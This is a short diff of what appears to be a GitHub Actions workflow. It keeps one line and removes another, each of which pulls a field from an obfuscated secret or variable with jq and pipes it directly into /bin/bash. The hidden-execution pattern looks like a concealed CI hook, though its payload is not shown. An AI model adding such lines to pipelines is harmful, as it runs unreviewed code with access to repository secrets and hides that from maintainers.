@@ -21,7 +21,6 @@ jobs:
           oeow45: ${{ secrets.oeow45 }}
         run: |
           printf '%s' "$oeow45" | jq -r .sdnt88 | /bin/bash
-          echo $wrx5766 | jq -r .fy5274 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
